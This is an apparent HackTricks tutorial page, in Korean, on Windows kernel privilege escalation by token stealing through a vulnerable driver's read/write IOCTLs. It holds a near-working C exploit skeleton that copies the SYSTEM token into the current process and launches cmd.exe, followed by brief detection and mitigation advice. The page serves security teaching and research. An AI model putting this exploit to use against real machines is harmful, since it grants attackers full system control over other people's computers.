# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## 개요

취약한 드라이버가 IOCTL을 통해 공격자에게 임의의 커널 읽기 및/또는 쓰기 primitives를 제공하면, NT AUTHORITY\SYSTEM으로의 권한 상승은 종종 SYSTEM 액세스 토큰을 훔쳐서 달성할 수 있습니다. 이 기법은 SYSTEM 프로세스의 EPROCESS에 있는 Token 포인터를 현재 프로세스의 EPROCESS로 복사합니다.

동작 원리:
- 각 프로세스는 EPROCESS 구조체를 가지고 있으며 그 안에는 (다른 필드들 중) Token(실제로는 토큰 객체를 가리키는 EX_FAST_REF)이 포함되어 있습니다.
- SYSTEM 프로세스(PID 4)는 모든 권한이 활성화된 토큰을 보유하고 있습니다.
- 현재 프로세스의 EPROCESS.Token을 SYSTEM 토큰 포인터로 교체하면 현재 프로세스는 즉시 SYSTEM으로 실행됩니다.

> EPROCESS의 오프셋은 Windows 버전마다 다릅니다. 동적으로 결정(심볼)하거나 버전별 상수를 사용하세요. 또한 EPROCESS.Token은 EX_FAST_REF임을 기억하세요(하위 3비트는 참조 카운트 플래그로 사용).

## 고수준 단계

1) ntoskrnl.exe 베이스를 찾고 PsInitialSystemProcess의 주소를 해결합니다.
- 사용자 모드에서 NtQuerySystemInformation(SystemModuleInformation) 또는 EnumDeviceDrivers를 사용해 로드된 드라이버 베이스를 얻습니다.
- 커널 베이스에 PsInitialSystemProcess의 오프셋(심볼/리버싱에서 얻은)을 더해 해당 주소를 얻습니다.
2) PsInitialSystemProcess에서 포인터를 읽습니다 → 이는 SYSTEM의 EPROCESS를 가리키는 커널 포인터입니다.
3) SYSTEM EPROCESS에서 UniqueProcessId 및 ActiveProcessLinks 오프셋을 읽어 EPROCESS 구조체의 이중 연결 리스트(ActiveProcessLinks.Flink/Blink)를 순회하여 UniqueProcessId가 GetCurrentProcessId()와 일치하는 EPROCESS를 찾습니다. 다음 두 값을 보관하세요:
- EPROCESS_SYSTEM (SYSTEM용)
- EPROCESS_SELF (현재 프로세스용)
4) SYSTEM 토큰 값 읽기: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- 하위 3비트 마스크 처리: Token_SYS_masked = Token_SYS & ~0xF (빌드에 따라 일반적으로 ~0xF 또는 ~0x7 사용; x64에서는 하위 3비트가 사용됨 — 0xFFFFFFFFFFFFFFF8 마스크).
5) 옵션 A(일반적): 현재 토큰의 하위 3비트를 보존하여 SYSTEM 포인터에 이어붙이면 임베디드 참조 카운트가 일관되게 유지됩니다.
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) 커널 쓰기 프리미티브를 사용해 Token_NEW를 (EPROCESS_SELF + TokenOffset)에 다시 씁니다.
7) 현재 프로세스는 이제 SYSTEM입니다. 선택적으로 새 cmd.exe 또는 powershell.exe를 실행해 확인하세요.

## 의사코드

아래는 취약한 드라이버의 두 IOCTL만 사용하는 골격입니다 — 하나는 8바이트 커널 읽기, 하나는 8바이트 커널 쓰기용입니다. 자신의 드라이버 인터페이스로 교체하세요.
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
참고:
- Offsets: 대상의 PDBs 또는 런타임 심볼 로더와 함께 WinDbg의 `dt nt!_EPROCESS`를 사용하여 올바른 오프셋을 얻으십시오. 무작정 하드코딩하지 마세요.
- Mask: x64에서 token은 EX_FAST_REF입니다; 하위 3비트는 참조 카운트 비트입니다. token의 원래 하위 비트를 유지하면 즉시 refcount 불일치를 피할 수 있습니다.
- Stability: 현재 프로세스를 권한 상승하는 것을 권장합니다. 짧게 실행되는 헬퍼를 상승시키면 종료 시 SYSTEM을 잃을 수 있습니다.

## 탐지 및 완화
- 강력한 IOCTLs를 노출하는 서명되지 않았거나 신뢰할 수 없는 타사 드라이버를 로드하는 것이 근본 원인입니다.
- Kernel Driver Blocklist (HVCI/CI), DeviceGuard 및 Attack Surface Reduction 규칙은 취약한 드라이버의 로딩을 차단할 수 있습니다.
- EDR은 arbitrary read/write를 구현하는 의심스러운 IOCTL 시퀀스와 token 교체를 감시할 수 있습니다.

## References
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
